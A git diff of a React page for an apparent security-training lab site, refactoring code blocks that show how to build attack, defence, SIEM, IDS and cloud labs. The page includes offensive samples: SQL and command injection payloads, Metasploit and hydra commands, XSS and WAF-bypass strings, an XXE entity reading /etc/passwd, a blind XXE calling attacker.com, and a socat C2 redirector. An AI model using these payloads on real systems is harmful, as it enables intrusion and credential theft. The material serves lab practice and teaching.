@@ -73,14 +73,14 @@ export default function LabsPage() {
                 </ul>
                 
                 <h4 className="text-lg font-semibold mt-4">Basic VirtualBox Network Setup</h4>
-                <CodeBlock language="bash">{`# Create an isolated network for your lab
+                <CodeBlock language="bash" code= {`# Create an isolated network for your lab
 VBoxManage natnetwork add --netname seclab --network "10.0.2.0/24" --enable
 
 # Enable DHCP on the network
 VBoxManage natnetwork modify --netname seclab --dhcp on
 
 # Connect a VM to this network
-VBoxManage modifyvm "Kali Linux" --nic1 natnetwork --nat-network1 seclab`}</CodeBlock>
+VBoxManage modifyvm "Kali Linux" --nic1 natnetwork --nat-network1 seclab`}/>
               </div>
             </div>
             
@@ -94,7 +94,7 @@ VBoxManage modifyvm "Kali Linux" --nic1 natnetwork --nat-network1 seclab`}</Code
                 <div>
                   <h4 className="text-lg font-semibold">Docker Security Lab</h4>
                   <p>Create a docker-compose file for a basic security lab:</p>
-                  <CodeBlock language="yaml">{`version: '3'
+                  <CodeBlock language="yaml"code={`version: '3'
 services:
   kali:
     image: kalilinux/kali-rolling
@@ -127,7 +127,7 @@ networks:
     driver: bridge
     ipam:
       config:
-        - subnet: 172.16.238.0/24`}</CodeBlock>
+        - subnet: 172.16.238.0/24`}/>
                 </div>
                 
                 <div>
@@ -218,7 +218,7 @@ networks:
                 </p>
                 
                 <h4 className="text-lg font-semibold">ELK Stack Setup</h4>
-                <CodeBlock language="yaml">{`version: '3'
+                <CodeBlock language="yaml" code={`version: '3'
 services:
   elasticsearch:
     image: docker.elastic.co/elasticsearch/elasticsearch:7.16.2
@@ -256,7 +256,7 @@ services:
       - logstash
       
 volumes:
-  elasticsearch-data:`}</CodeBlock>
+  elasticsearch-data:`}/>
 
                 <h4 className="text-lg font-semibold mt-4">Lab Exercises</h4>
                 <ul className="list-disc pl-6 space-y-2">
@@ -276,7 +276,7 @@ volumes:
                 
                 <h4 className="text-lg font-semibold">Wazuh Setup</h4>
                 <p>Wazuh provides a comprehensive open-source security monitoring solution:</p>
-                <CodeBlock language="bash">{`# Clone the Wazuh Docker repository
+                <CodeBlock language="bash" code={`# Clone the Wazuh Docker repository
 git clone https://github.com/wazuh/wazuh-docker.git
 cd wazuh-docker/single-node
 
@@ -298,7 +298,7 @@ echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/source
 apt-get update
 apt-get install wazuh-agent
 # Edit /var/ossec/etc/ossec.conf to set the manager IP
-# Start the agent: systemctl start wazuh-agent`}</CodeBlock>
+# Start the agent: systemctl start wazuh-agent`} />
 
                 <h4 className="text-lg font-semibold mt-4">Lab Exercises</h4>
                 <ul className="list-disc pl-6 space-y-2">
@@ -329,7 +329,7 @@ apt-get install wazuh-agent
                         <li>Monitoring interface (connected to SPAN port or TAP)</li>
                       </ul>
                     </li>
-                    <li>Run the setup wizard and choose "Evaluation Mode" for a lab environment</li>
+                    <li>Run the setup wizard and choose &quot;Evaluation Mode&quot; for a lab environment</li>
                     <li>Configure Zeek, Suricata, and Elastic Stack during setup</li>
                   </ol>
                 </div>
@@ -437,7 +437,7 @@ apt-get install wazuh-agent
               <AlertTitle>Ethical Hacking Notice</AlertTitle>
               <AlertDescription>
                 Only practice offensive security techniques in controlled lab environments or with explicit permission.
-                Unauthorized testing against systems you don't own is illegal and unethical.
+                Unauthorized testing against systems you don&apos;t own is illegal and unethical.
               </AlertDescription>
             </Alert>
             
@@ -450,7 +450,7 @@ apt-get install wazuh-agent
                 
                 <h4 className="text-lg font-semibold">Attack Platform Setup</h4>
                 <p>Kali Linux is the most popular penetration testing distribution:</p>
-                <CodeBlock language="bash">{`# Download Kali Linux (VM or ISO)
+                <CodeBlock language="bash" code={`# Download Kali Linux (VM or ISO)
 # From: https://www.kali.org/get-kali/
 
 # Update and install additional tools
@@ -468,7 +468,7 @@ echo "10.0.2.5" > targets.txt
 echo "10.0.2.10" >> targets.txt
 
 # Start your reconnaissance
-sudo nmap -sS -A -T4 -oA recon/initial-scan -iL targets.txt`}</CodeBlock>
+sudo nmap -sS -A -T4 -oA recon/initial-scan -iL targets.txt`}/>
 
                 <h4 className="text-lg font-semibold mt-4">Target Environment</h4>
                 <p>Set up vulnerable targets to practice against:</p>
@@ -495,14 +495,14 @@ sudo nmap -sS -A -T4 -oA recon/initial-scan -iL targets.txt`}</CodeBlock>
                     <li>Service enumeration</li>
                     <li>Web application discovery</li>
                   </ul>
-                  <CodeBlock language="bash">{`# Basic network scan
+                  <CodeBlock language="bash"code={`# Basic network scan
 sudo nmap -sS -A -T4 10.0.2.0/24
 
 # Service enumeration
 sudo nmap -sV -sC -p- 10.0.2.5
 
 # Web application discovery
-dirb http://10.0.2.5/ /usr/share/wordlists/dirb/common.txt`}</CodeBlock>
+dirb http://10.0.2.5/ /usr/share/wordlists/dirb/common.txt`}/>
                 </div>
                 
                 <div className="border p-4 rounded-lg mt-4">
@@ -512,14 +512,14 @@ dirb http://10.0.2.5/ /usr/share/wordlists/dirb/common.txt`}</CodeBlock>
                     <li>Use vulnerability scanners</li>
                     <li>Manual testing for false positives/negatives</li>
                   </ul>
-                  <CodeBlock language="bash">{`# Vulnerability scanning with Nessus (if available)
+                  <CodeBlock language="bash"code={`# Vulnerability scanning with Nessus (if available)
 # Or use OpenVAS
 
 # Web vulnerability scanning
 nikto -h http://10.0.2.5
 
 # SQL injection testing
-sqlmap -u "http://10.0.2.5/page.php?id=1" --dbs`}</CodeBlock>
+sqlmap -u "http://10.0.2.5/page.php?id=1" --dbs`}/>
                 </div>
                 
                 <div className="border p-4 rounded-lg mt-4">
@@ -529,7 +529,7 @@ sqlmap -u "http://10.0.2.5/page.php?id=1" --dbs`}</CodeBlock>
                     <li>Gain initial access</li>
                     <li>Document successful attack paths</li>
                   </ul>
-                  <CodeBlock language="bash">{`# Using Metasploit
+                  <CodeBlock language="bash"code={`# Using Metasploit
 msfconsole
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
 set RHOSTS 10.0.2.5
@@ -537,7 +537,7 @@ set TARGETURI /cgi-bin/vulnerable.cgi
 exploit
 
 # Password cracking
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}</CodeBlock>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}/>
                 </div>
                 
                 <div className="border p-4 rounded-lg mt-4">
@@ -548,7 +548,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form "/log
                     <li>Data exfiltration</li>
                     <li>Persistence (if in scope)</li>
                   </ul>
-                  <CodeBlock language="bash">{`# Linux privilege escalation
+                  <CodeBlock language="bash"code={`# Linux privilege escalation
 ./linpeas.sh
 
 # Windows privilege escalation
@@ -556,7 +556,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.5 http-post-form "/log
 
 # Data collection
 find / -name "*.conf" -o -name "*.config" 2>/dev/null
-grep -r "password" /etc/ 2>/dev/null`}</CodeBlock>
+grep -r "password" /etc/ 2>/dev/null`}/>
                 </div>
               </div>
             </div>
@@ -639,13 +639,13 @@ grep -r "password" /etc/ 2>/dev/null`}</CodeBlock>
                     <li><strong>Phishing infrastructure</strong> - Set up GoPhish or similar</li>
                   </ul>
                   
-                  <CodeBlock language="bash">{`# Example: Setting up a simple C2 redirector with socat
+                  <CodeBlock language="bash"code={`# Example: Setting up a simple C2 redirector with socat
 # On your redirector server:
 socat TCP4-LISTEN:80,fork TCP4:actual-c2-server:80
 
 # Setting up Apache as a redirector
 apt install apache2
-# Configure Apache with mod_rewrite to forward specific paths`}</CodeBlock>
+# Configure Apache with mod_rewrite to forward specific paths`}/>
                 </div>
                 
                 <div>
@@ -733,7 +733,7 @@ apt install apache2
                   <li><strong>IoT Network</strong> (10.0.5.0/24) - IoT devices</li>
                 </ul>
                 
-                <CodeBlock language="bash">{`# Example pfSense firewall rules (conceptual)
+                <CodeBlock language="bash"code={`# Example pfSense firewall rules (conceptual)
 
 # Allow management network to access all networks
 allow from 10.0.1.0/24 to any
@@ -751,7 +751,7 @@ allow from WAN to 10.0.4.0/24 port 80,443
 
 # Isolate IoT network
 allow from 10.0.5.0/24 to WAN
-deny from 10.0.5.0/24 to 10.0.1.0/24,10.0.2.0/24,10.0.3.0/24,10.0.4.0/24`}</CodeBlock>
+deny from 10.0.5.0/24 to 10.0.1.0/24,10.0.2.0/24,10.0.3.0/24,10.0.4.0/24`}/>
               </div>
               
               <div className="space-y-4">
@@ -761,7 +761,7 @@ deny from 10.0.5.0/24 to 10.0.1.0/24,10.0.2.0/24,10.0.3.0/24,10.0.4.0/24`}</Code
                 </p>
                 
                 <h4 className="text-lg font-semibold">Suricata Setup</h4>
-                <CodeBlock language="bash">{`# Install Suricata on Ubuntu/Debian
+                <CodeBlock language="bash"code={`# Install Suricata on Ubuntu/Debian
 sudo apt update
 sudo apt install -y suricata
 
@@ -780,11 +780,11 @@ sudo systemctl start suricata
 sudo tail -f /var/log/suricata/fast.log
 
 # For IPS mode, configure NFQ or AF_PACKET inline mode
-# and set appropriate iptables rules`}</CodeBlock>
+# and set appropriate iptables rules`}/>
 
                 <h4 className="text-lg font-semibold mt-4">Custom Rule Development</h4>
                 <p>Practice writing custom Suricata/Snort rules:</p>
-                <CodeBlock language="bash">{`# Create a custom rules file
+                <CodeBlock language="bash"code={`# Create a custom rules file
 sudo nano /etc/suricata/rules/local.rules
 
 # Example rules:
@@ -805,7 +805,7 @@ alert http any any -> $HOME_NET any (msg:"Unusual User-Agent"; \
   classtype:trojan-activity; sid:10000003; rev:1;)
 
 # Reload rules
-sudo suricatasc -c reload-rules`}</CodeBlock>
+sudo suricatasc -c reload-rules`}/>
 
                 <h4 className="text-lg font-semibold mt-4">Lab Exercises</h4>
                 <ul className="list-disc pl-6 space-y-2">
@@ -825,7 +825,7 @@ sudo suricatasc -c reload-rules`}</CodeBlock>
                 <div>
                   <h4 className="text-lg font-semibold">OpenVPN Setup</h4>
                   <p>Configure a secure VPN server for remote access:</p>
-                  <CodeBlock language="bash">{`# Install OpenVPN on Ubuntu
+                  <CodeBlock language="bash"code={`# Install OpenVPN on Ubuntu
 sudo apt update
 sudo apt install -y openvpn easy-rsa
 
@@ -855,7 +855,7 @@ sudo cp ~/openvpn-ca/pki/dh.pem /etc/openvpn/
 sudo nano /etc/openvpn/server.conf
 
 # Start OpenVPN server
-sudo systemctl start openvpn@server`}</CodeBlock>
+sudo systemctl start openvpn@server`}/>
                 </div>
                 
                 <div>
@@ -908,7 +908,7 @@ sudo systemctl start openvpn@server`}</CodeBlock>
                 <div>
                   <h4 className="text-lg font-semibold">Traffic Capture Setup</h4>
                   <p>Configure systems to capture and analyze network traffic:</p>
-                  <CodeBlock language="bash">{`# Install Wireshark and tcpdump
+                  <CodeBlock language="bash"code={`# Install Wireshark and tcpdump
 sudo apt update
 sudo apt install -y wireshark tcpdump tshark
 
@@ -922,7 +922,7 @@ sudo tcpdump -i eth0 -G 3600 -w 'capture-%Y%m%d-%H%M%S.pcap' -z gzip
 sudo tcpdump -i eth0 -w http-traffic.pcap port 80
 
 # Convert pcap to readable format
-tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.request.method -e http.request.uri > traffic.txt`}</CodeBlock>
+tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e http.request.method -e http.request.uri > traffic.txt`}/>
                 </div>
                 
                 <div>
@@ -962,7 +962,7 @@ tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcpor
               </div>
               
               <h4 className="text-lg font-semibold mt-4">Sample Analysis Commands</h4>
-              <CodeBlock language="bash">{`# Top talkers (most active IP addresses)
+              <CodeBlock language="bash"code={`# Top talkers (most active IP addresses)
 tshark -r capture.pcap -q -z conv,ip
 
 # HTTP user agents
@@ -979,7 +979,7 @@ tshark -r capture.pcap --export-objects http,./http_objects
 tshark -r capture.pcap -Y "dns.qry.name.len > 50" -T fields -e dns.qry.name
 
 # Detect potential port scanning
-tshark -r capture.pcap -q -z endpoints,tcp | sort -k 5 -nr | head`}</CodeBlock>
+tshark -r capture.pcap -q -z endpoints,tcp | sort -k 5 -nr | head`}/>
             </div>
           </div>
         </TabsContent>
@@ -998,25 +998,25 @@ tshark -r capture.pcap -q -z endpoints,tcp | sort -k 5 -nr | head`}</CodeBlock>
                 
                 <h4 className="text-lg font-semibold">DVWA Setup</h4>
                 <p>Damn Vulnerable Web Application is a PHP/MySQL web application with intentional vulnerabilities:</p>
-                <CodeBlock language="bash">{`# Using Docker (recommended)
+                <CodeBlock language="bash"code={`# Using Docker (recommended)
 docker run --rm -it -p 80:80 vulnerables/web-dvwa
 
 # Manual setup
 git clone https://github.com/digininja/DVWA.git
 cd DVWA
 # Configure database in config/config.inc.php
-# Set up with a web server (Apache/Nginx) and PHP`}</CodeBlock>
+# Set up with a web server (Apache/Nginx) and PHP`}/>
 
                 <h4 className="text-lg font-semibold mt-4">OWASP Juice Shop Setup</h4>
                 <p>A modern vulnerable web application built with Node.js:</p>
-                <CodeBlock language="bash">{`# Using Docker
+                <CodeBlock language="bash"code={`# Using Docker
 docker run --rm -it -p 3000:3000 bkimminich/juice-shop
 
 # Using Node.js
 git clone https://github.com/juice-shop/juice-shop.git
 cd juice-shop
 npm install
-npm start`}</CodeBlock>
+npm start`}/>
 
                 <h4 className="text-lg font-semibold mt-4">Additional Vulnerable Applications</h4>
                 <ul className="list-disc pl-6 space-y-2">
@@ -1043,14 +1043,14 @@ npm start`}</CodeBlock>
                 
                 <h4 className="text-lg font-semibold mt-4">OWASP ZAP Setup</h4>
                 <p>ZAP is a free alternative to Burp Suite with powerful features:</p>
-                <CodeBlock language="bash">{`# Install ZAP on Ubuntu
+                <CodeBlock language="bash"code={`# Install ZAP on Ubuntu
 sudo apt update
 sudo apt install -y zaproxy
 
 # Or download from https://www.zaproxy.org/download/
 
 # Run ZAP and configure browser proxy settings
-# Configure scope to include only your lab applications`}</CodeBlock>
+# Configure scope to include only your lab applications`}/>
 
                 <h4 className="text-lg font-semibold mt-4">Additional Web Testing Tools</h4>
                 <ul className="list-disc pl-6 space-y-2">
@@ -1077,14 +1077,14 @@ sudo apt install -y zaproxy
                     <li>Access DVWA and set security level to low</li>
                     <li>Navigate to the SQL Injection page</li>
                     <li>Practice manual SQL injection:
-                      <CodeBlock language="sql">{`' OR 1=1 --
+                      <CodeBlock language="sql"code={`' OR 1=1 --
 ' UNION SELECT user,password FROM users --
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`}</CodeBlock>
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --`}/>
                     </li>
                     <li>Use SQLmap for automated testing:
-                      <CodeBlock language="bash">{`sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" --dbs
+                      <CodeBlock language="bash"code={`sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" --dbs
 sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -D dvwa --tables
-sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -D dvwa -T users --dump`}</CodeBlock>
+sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=low" -D dvwa -T users --dump`}/>
                     </li>
                   </ol>
                   
@@ -1092,9 +1092,9 @@ sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
                   <ol className="list-decimal pl-6 space-y-1">
                     <li>Navigate to the Command Injection page in DVWA</li>
                     <li>Practice command injection payloads:
-                      <CodeBlock language="bash">{`127.0.0.1 && whoami
+                      <CodeBlock language="bash"code={`127.0.0.1 && whoami
 127.0.0.1 | cat /etc/passwd
-127.0.0.1 ; ls -la`}</CodeBlock>
+127.0.0.1 ; ls -la`}/>
                     </li>
                   </ol>
                 </div>
@@ -1108,11 +1108,11 @@ sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --coo
                       <ul className="list-disc pl-6">
                         <li>Default credentials (admin/admin, admin/password)</li>
                         <li>Brute force with Hydra:
-                          <CodeBlock language="bash">{`hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}</CodeBlock>
+                          <CodeBlock language="bash"code={`hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Login failed"`}/>
                         </li>
                         <li>Test for SQL injection in login forms:
-                          <CodeBlock language="sql">{`admin' --
-admin' OR 1=1 --`}</CodeBlock>
+                          <CodeBlock language="sql"code={`admin' --
+admin' OR 1=1 --`}/>
                         </li>
                         <li>Test for remember-me functionality vulnerabilities</li>
                         <li>Check for weak password reset mechanisms</li>
@@ -1130,11 +1130,11 @@ admin' OR 1=1 --`}</CodeBlock>
                       </ul>
                     </li>
                     <li>Check for directory traversal vulnerabilities:
-                      <CodeBlock language="bash">{`../../../etc/passwd
-..%2f..%2f..%2fetc%2fpasswd`}</CodeBlock>
+                      <CodeBlock language="bash"code={`../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd`}/>
                     </li>
                     <li>Search for exposed configuration files and backups:
-                      <CodeBlock language="bash">{`gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -x .bak,.config,.old,.backup`}</CodeBlock>
+                      <CodeBlock language="bash"code={`gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt -x .bak,.config,.old,.backup`}/>
                     </li>
                   </ol>
                 </div>
@@ -1146,20 +1146,20 @@ admin' OR 1=1 --`}</CodeBlock>
                   <ol className="list-decimal pl-6 space-y-1">
                     <li>Identify XML input points in applications</li>
                     <li>Test for XXE vulnerabilities:
-                      <CodeBlock language="xml">{`<?xml version="1.0" encoding="ISO-8859-1"?>
+                      <CodeBlock language="xml"code={`<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<foo>&xxe;</foo>`}</CodeBlock>
+<foo>&xxe;</foo>`}/>
                     </li>
                     <li>Test for blind XXE using out-of-band techniques:
-                      <CodeBlock language="xml">{`<?xml version="1.0" encoding="ISO-8859-1"?>
+                      <CodeBlock language="xml"code={`<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd" >
 %xxe;
 ]>
-<foo>Triggered</foo>`}</CodeBlock>
+<foo>Triggered</foo>`}/>
                     </li>
                   </ol>
                   
@@ -1178,11 +1178,11 @@ admin' OR 1=1 --`}</CodeBlock>
                       </ul>
                     </li>
                     <li>Test for insecure direct object references:
-                      <CodeBlock language="bash">{`# Original request
+                      <CodeBlock language="bash"code={`# Original request
 GET /app/account/123
 
 # Modified request
-GET /app/account/124`}</CodeBlock>
+GET /app/account/124`}/>
                     </li>
                   </ol>
                 </div>
@@ -1191,11 +1191,11 @@ GET /app/account/124`}</CodeBlock>
                   <h4 className="text-lg font-semibold">6. Cross-Site Scripting (XSS)</h4>
                   <ol className="list-decimal pl-6 space-y-1">
                     <li>Identify input fields and test for XSS:
-                      <CodeBlock language="html">{`<script>alert('XSS')</script>
+                      <CodeBlock language="html"code={`<script>alert('XSS')</script>
 <img src="x" onerror="alert('XSS')">
 <body onload="alert('XSS')">
 <svg/onload=alert('XSS')>
-javascript:alert('XSS')`}</CodeBlock>
+javascript:alert('XSS')`}/>
                     </li>
                     <li>Test for different XSS types:
                       <ul className="list-disc pl-6">
@@ -1218,11 +1218,11 @@ javascript:alert('XSS')`}</CodeBlock>
                     <li>Check for default credentials on applications</li>
                     <li>Look for unnecessary features enabled</li>
                     <li>Test for directory listing:
-                      <CodeBlock language="bash">{`dirb http://localhost/`}</CodeBlock>
+                      <CodeBlock language="bash"code={`dirb http://localhost/`}/>
                     </li>
                     <li>Check for information disclosure in error messages</li>
                     <li>Scan for outdated software and components:
-                      <CodeBlock language="bash">{`nikto -h http://localhost/`}</CodeBlock>
+                      <CodeBlock language="bash"code={`nikto -h http://localhost/`}/>
                     </li>
                   </ol>
                 </div>
@@ -1239,7 +1239,7 @@ javascript:alert('XSS')`}</CodeBlock>
                 <div>
                   <h4 className="text-lg font-semibold">ModSecurity Setup</h4>
                   <p>Configure ModSecurity with OWASP Core Rule Set (CRS):</p>
-                  <CodeBlock language="bash">{`# Install ModSecurity with Apache
+                  <CodeBlock language="bash"code={`# Install ModSecurity with Apache
 sudo apt update
 sudo apt install -y libapache2-mod-security2
 
@@ -1261,7 +1261,7 @@ sudo nano /etc/apache2/mods-enabled/security2.conf
 # Add: Include /etc/modsecurity/coreruleset/rules/*.conf
 
 # Restart Apache
-sudo systemctl restart apache2`}</CodeBlock>
+sudo systemctl restart apache2`}/>
                 </div>
                 
                 <div>
@@ -1278,21 +1278,21 @@ sudo systemctl restart apache2`}</CodeBlock>
                     <li><strong>WAF Bypass Techniques</strong>:
                       <ul className="list-disc pl-6">
                         <li>Encoding variations:
-                          <CodeBlock language="bash">{`# URL encoding
+                          <CodeBlock language="bash"code={`# URL encoding
 %3Cscript%3Ealert(1)%3C%2Fscript%3E
 
 # Double encoding
 %253Cscript%253Ealert(1)%253C%252Fscript%253E
 
 # Unicode encoding
-\u003Cscript\u003Ealert(1)\u003C/script\u003E`}</CodeBlock>
+\u003Cscript\u003Ealert(1)\u003C/script\u003E`}/>
                         </li>
                         <li>Case manipulation:
-                          <CodeBlock language="html">{`<ScRiPt>alert(1)</sCrIpT>`}</CodeBlock>
+                          <CodeBlock language="html"code={`<ScRiPt>alert(1)</sCrIpT>`}/>
                         </li>
                         <li>Fragmentation and obfuscation:
-                          <CodeBlock language="html">{`<img src="x" o
-nerror="alert(1)">`}</CodeBlock>
+                          <CodeBlock language="html"code={`<img src="x" o
+nerror="alert(1)">`}/>
                         </li>
                       </ul>
                     </li>
@@ -1330,12 +1330,12 @@ nerror="alert(1)">`}</CodeBlock>
                   <li>Set up multi-factor authentication (MFA) for the root account</li>
                   <li>Create an IAM user with administrative permissions</li>
                   <li>Configure AWS CLI with your credentials:
-                    <CodeBlock language="bash">{`aws configure
+                    <CodeBlock language="bash"code={`aws configure
 # Enter your Access Key ID and Secret Access Key
-# Set default region and output format`}</CodeBlock>
+# Set default region and output format`}/>
                   </li>
                   <li>Create a basic VPC with public and private subnets:
-                    <CodeBlock language="bash">{`# Create a VPC
+                    <CodeBlock language="bash"code={`# Create a VPC
 aws ec2 create-vpc --cidr-block 10.0.0.0/16 --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=SecurityLab}]'
 
 # Create subnets
@@ -1344,7 +1344,7 @@ aws ec2 create-subnet --vpc-id vpc-id --cidr-block 10.0.2.0/24 --availability-zo
 
 # Create and attach internet gateway
 aws ec2 create-internet-gateway --tag-specifications 'ResourceType=internet-gateway,Tags=[{Key=Name,Value=SecurityLabIGW}]'
-aws ec2 attach-internet-gateway --vpc-id vpc-id --internet-gateway-id igw-id`}</CodeBlock>
+aws ec2 attach-internet-gateway --vpc-id vpc-id --internet-gateway-id igw-id`}/>
                   </li>
                 </ol>
                 
@@ -1360,7 +1360,7 @@ aws ec2 attach-internet-gateway --vpc-id vpc-id --internet-gateway-id igw-id`}</
                     </ul>
                   </li>
                   <li><strong>S3 Security</strong>:
-                    <CodeBlock language="bash">{`# Create a secure S3 bucket
+                    <CodeBlock language="bash"code={`# Create a secure S3 bucket
 aws s3api create-bucket --bucket secure-bucket-name --region us-east-1
 
 # Enable S3 Block Public Access
@@ -1370,7 +1370,7 @@ aws s3api put-public-access-block --bucket secure-bucket-name --public-access-bl
 aws s3api put-bucket-encryption --bucket secure-bucket-name --server-side-encryption-configuration '{"Rules": [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "AES256"}}]}'
 
 # Enable S3 versioning
-aws s3api put-bucket-versioning --bucket secure-bucket-name --versioning-configuration Status=Enabled`}</CodeBlock>
+aws s3api put-bucket-versioning --bucket secure-bucket-name --versioning-configuration Status=Enabled`}/>
                   </li>
                 </ul>
               </div>
@@ -1386,19 +1386,19 @@ aws s3api put-bucket-versioning --bucket secure-bucket-name --versioning-configu
                   <li>Create an Azure Free Account</li>
                   <li>Set up multi-factor authentication</li>
                   <li>Install Azure CLI:
-                    <CodeBlock language="bash">{`# Install Azure CLI on Ubuntu
+                    <CodeBlock language="bash"code={`# Install Azure CLI on Ubuntu
 curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
 
 # Login to Azure
-az login`}</CodeBlock>
+az login`}/>
                   </li>
                   <li>Create a resource group for your lab:
-                    <CodeBlock language="bash">{`az group create --name SecurityLab --location eastus`}</CodeBlock>
+                    <CodeBlock language="bash"code={`az group create --name SecurityLab --location eastus`}/>
                   </li>
                   <li>Create a virtual network with subnets:
-                    <CodeBlock language="bash">{`az network vnet create --resource-group SecurityLab --name SecurityVNet --address-prefix 10.0.0.0/16 --subnet-name PublicSubnet --subnet-prefix 10.0.1.0/24
+                    <CodeBlock language="bash"code={`az network vnet create --resource-group SecurityLab --name SecurityVNet --address-prefix 10.0.0.0/16 --subnet-name PublicSubnet --subnet-prefix 10.0.1.0/24
 
-az network vnet subnet create --resource-group SecurityLab --vnet-name SecurityVNet --name PrivateSubnet --address-prefix 10.0.2.0/24`}</CodeBlock>
+az network vnet subnet create --resource-group SecurityLab --vnet-name SecurityVNet --name PrivateSubnet --address-prefix 10.0.2.0/24`}/>
                   </li>
                 </ol>
                 
@@ -1413,24 +1413,24 @@ az network vnet subnet create --resource-group SecurityLab --vnet-name SecurityV
                     </ul>
                   </li>
                   <li><strong>Azure Network Security</strong>:
-                    <CodeBlock language="bash">{`# Create a Network Security Group
+                    <CodeBlock language="bash"code={`# Create a Network Security Group
 az network nsg create --resource-group SecurityLab --name SecureNSG
 
 # Add security rules
 az network nsg rule create --resource-group SecurityLab --nsg-name SecureNSG --name AllowSSH --priority 100 --source-address-prefixes '*' --source-port-ranges '*' --destination-address-prefixes '*' --destination-port-ranges 22 --access Allow --protocol Tcp --description "Allow SSH"
 
 # Associate NSG with subnet
-az network vnet subnet update --resource-group SecurityLab --vnet-name SecurityVNet --name PublicSubnet --network-security-group SecureNSG`}</CodeBlock>
+az network vnet subnet update --resource-group SecurityLab --vnet-name SecurityVNet --name PublicSubnet --network-security-group SecureNSG`}/>
                   </li>
                   <li><strong>Azure Key Vault</strong>:
-                    <CodeBlock language="bash">{`# Create a Key Vault
+                    <CodeBlock language="bash"code={`# Create a Key Vault
 az keyvault create --resource-group SecurityLab --name SecureKeyVault --location eastus
 
 # Add a secret to Key Vault
 az keyvault secret set --vault-name SecureKeyVault --name ExamplePassword --value "SecureP@ssw0rd"
 
 # Configure access policy
-az keyvault set-policy --resource-group SecurityLab --name SecureKeyVault --upn user@example.com --secret-permissions get list set delete`}</CodeBlock>
+az keyvault set-policy --resource-group SecurityLab --name SecureKeyVault --upn user@example.com --secret-permissions get list set delete`}/>
                   </li>
                 </ul>
               </div>
@@ -1443,7 +1443,7 @@ az keyvault set-policy --resource-group SecurityLab --name SecureKeyVault --upn 
                 <div>
                   <h4 className="text-lg font-semibold">AWS CloudTrail and GuardDuty</h4>
                   <p>Set up monitoring and detection services in AWS:</p>
-                  <CodeBlock language="bash">{`# Enable CloudTrail
+                  <CodeBlock language="bash"code={`# Enable CloudTrail
 aws cloudtrail create-trail --name SecurityLabTrail --s3-bucket-name cloudtrail-logs-bucket --is-multi-region-trail --enable-log-file-validation
 
 # Start logging
@@ -1453,24 +1453,24 @@ aws cloudtrail start-logging --name SecurityLabTrail
 aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES
 
 # Create CloudWatch alarms for specific events
-aws cloudwatch put-metric-alarm --alarm-name RootAccountUsage --metric-name RootAccountUsage --namespace CloudTrailMetrics --statistic Sum --period 300 --threshold 1 --comparison-operator GreaterThanOrEqualToThreshold --evaluation-periods 1 --alarm-actions arn:aws:sns:us-east-1:account-id:security-alerts`}</CodeBlock>
+aws cloudwatch put-metric-alarm --alarm-name RootAccountUsage --metric-name RootAccountUsage --namespace CloudTrailMetrics --statistic Sum --period 300 --threshold 1 --comparison-operator GreaterThanOrEqualToThreshold --evaluation-periods 1 --alarm-actions arn:aws:sns:us-east-1:account-id:security-alerts`}/>
                   
                   <h4 className="text-lg font-semibold mt-4">AWS Security Hub</h4>
                   <p>Enable and configure AWS Security Hub:</p>
-                  <CodeBlock language="bash">{`# Enable Security Hub
+                  <CodeBlock language="bash"code={`# Enable Security Hub
 aws securityhub enable-security-hub
 
 # Enable security standards
 aws securityhub batch-enable-standards --standards-subscription-requests '[{"StandardsArn":"arn:aws:securityhub:us-east-1::standards/aws-foundational-security-best-practices/v/1.0.0"}]'
 
 # Get findings
-aws securityhub get-findings --filter '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'`}</CodeBlock>
+aws securityhub get-findings --filter '{"SeverityLabel":[{"Value":"CRITICAL","Comparison":"EQUALS"}]}'`}/>
                 </div>
                 
                 <div>
